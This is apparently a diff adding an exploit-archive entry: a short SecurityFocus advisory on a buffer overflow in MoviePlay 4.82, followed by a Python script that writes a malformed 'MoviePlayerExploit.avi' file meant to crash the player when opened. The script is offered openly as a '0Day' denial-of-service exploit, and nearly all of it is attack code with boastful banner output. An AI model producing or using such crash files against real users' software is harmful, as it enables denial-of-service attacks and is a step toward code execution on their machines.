@@ -1,0 +1,57 @@
+source: http://www.securityfocus.com/bid/47111/info
+
+MoviePlay is prone to a buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied data.
+
+Attackers may leverage this issue to execute arbitrary code in the context of the application. Failed attacks will cause denial-of-service conditions.
+
+MoviePlay 4.82 is vulnerable; other versions may also be affected.
+
+#!/usr/bin/python
+#(+)Exploit Title: Movie Player v4.82 0Day Buffer overflow/DOS Exploit
+#(+)Software Link: http://www.movieplay.org/download.php
+#(+)Software  : Movie Player
+#(+)Version   : v4.82
+#(+)Tested On : WIN-XP SP3
+#(+) Date     : 31.03.2011
+#(+) Hour     : 3:37 PM
+#Similar Bug was found by cr4wl3r in MediaPlayer Classic
+
+print " _______________________________________________________________________";
+																	
+print "(+)Exploit Title: Movie Player v4.82 0Day Buffer overflow/DOS Exploit";
+ 
+print "(+) Software Link: http://www.movieplay.org/download.php";
+print "(+) Software  : Movie Player";
+print "(+) Version   : v4.82";
+print "(+) Tested On : WIN-XP SP3";
+print "(+) Date      : 31.03.2011";
+print "(+) Hour      : 13:37 PM	";
+print "____________________________________________________________________\n	";
+import time
+time.sleep (2);
+print "\nGenerating the exploit file !!!";
+time.sleep (2);
+print "\n\nMoviePlayerExploit.avi file generated!!";
+time.sleep (2);
+
+ExploitLocation = "C:\\MoviePlayerExploit.avi"
+f = open(ExploitLocation, "wb")
+memoryloc ='\x4D\x54\x68\x64\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00';
+f.write(memoryloc)
+f.close()
+ 
+
+
+print "\n\n(+) Done!\n";
+print  "(+) Now Just open MoviePlayerExploit.avi with Movie Player and Kaboooommm !! ;) \n";
+print "(+) Most of the times there is a crash\n whenever you open the folder where the MoviePlayerExploit.avi is stored :D \n";
+
+time.sleep (2);
+time.sleep (1);
+print "\n\n\n########################################################################\n (+)Exploit Coded by: ^Xecuti0N3r & d3M0l!tioN3r \n";
+print "(+)^Xecuti0N3r: E-mail \n";
+print "(+)d3M0l!tioN3r: E-mail \n";
+print "(+)Special Thanks to: MaxCaps & aNnIh!LatioN3r \n";
+print "########################################################################\n\n";
+time.sleep (4);
+
